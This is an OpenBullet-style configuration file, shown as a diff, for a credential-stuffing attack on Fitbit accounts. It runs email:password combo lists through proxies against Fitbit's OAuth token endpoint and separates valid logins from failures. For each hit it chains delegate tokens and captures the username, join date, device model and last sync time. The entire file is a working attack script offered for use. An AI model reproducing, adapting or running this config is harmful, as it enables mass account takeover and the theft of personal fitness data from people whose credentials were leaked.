@@ -1,0 +1,75 @@
+[SETTINGS]
+{
+  "Name": "fitbit",
+  "SuggestedBots": 50,
+  "LastModified": "2019-03-16T04:16:44.8949115+01:00",
+  "AdditionalInfo": "",
+  "Author": "noob007",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#Credits_noob007 REQUEST POST "https://api.fitbit.com/oauth2/token" AutoRedirect=TRUE 
+  CONTENT "grant_type=password&username=<USER>&password=<PASS>&session-data=%7B%22browser-name%22%3A%22Firefox%22%2C%22browser-version%22%3A%2265.0%22%2C%22os-name%22%3A%22Windows%22%2C%22os-version%22%3A%2210%22%2C%22device-model%22%3A%22%22%2C%22device-manufacturer%22%3A%22%22%2C%22device-name%22%3A%22Windows%22%7D&client_id=228TQF&access_token=on&enableRefreshToken=true" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://accounts.fitbit.com" 
+#Token PARSE "<SOURCE>" LR "{\"access_token\":\"" "\",\"expires_in" Recursive=FALSE -> VAR "TOKEN" "" "" 
+#Token_Type PARSE "<SOURCE>" LR "token_type\":\"" "\",\"user_id" Recursive=FALSE -> VAR "TYPE" "" "" 
+#ID PARSE "<SOURCE>" LR "\",\"user_id\":\"" "\"}" Recursive=FALSE -> VAR "ID" "" "" 
+#Success/Failre KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "user_id" 
+  KEYCHAIN Failure OR 
+    KEY "success\":false" 
+#Info REQUEST GET "https://www.fitbit.com/user/<ID>" AutoRedirect=FALSE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://www.fitbit.com/" 
+#User PARSE "<SOURCE>" LR "user-name=\"" ".\" data-date=\"" Recursive=FALSE -> CAP "User" "" "" 
+#Date PARSE "<SOURCE>" LR "class=\"user-stat joined\">" " </li>" Recursive=FALSE -> CAP "Date " "" "" 
+#Oauth REQUEST POST "https://api.fitbit.com/oauth2/delegate" AutoRedirect=FALSE 
+  CONTENT "grant_type=delegate_token&client_id=228TQD" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: <TYPE> <TOKEN>" 
+#Token2 PARSE "<SOURCE>" LR "\":{\"delegate_token\":\"" "\",\"expires_in\":" Recursive=FALSE -> VAR "TOKEN2" "" "" 
+#Oauth_Token REQUEST POST "https://api.fitbit.com/oauth2/delegate/token" AutoRedirect=TRUE 
+  CONTENT "token=<TOKEN2>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: <TYPE> <TOKEN>" 
+#Token3 PARSE "<SOURCE>" LR "\":{\"access_token\":\"" "\",\"expires_in\":28800,\"scope\":\"" Recursive=FALSE -> VAR "TOKEN3" "" "" 
+#Get_Devices REQUEST GET "https://web-api.fitbit.com/1/user/<ID>/devices.json" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Authorization: <TYPE> <TOKEN3>" 
+#Devices PARSE "<SOURCE>" LR "deviceVersion\":\"" "\",\"features\"" Recursive=FALSE -> CAP "Device" "" "" 
+#SynkTime PARSE "<SOURCE>" LR "lastSyncTime\":\"" "\",\"mac\":\"" Recursive=FALSE -> CAP "LatSynkTime" "" "" 
+#Credits FUNCTION Replace "<ID>" "noob007" UseRegex=FALSE "<ID>" -> CAP "Credits" 
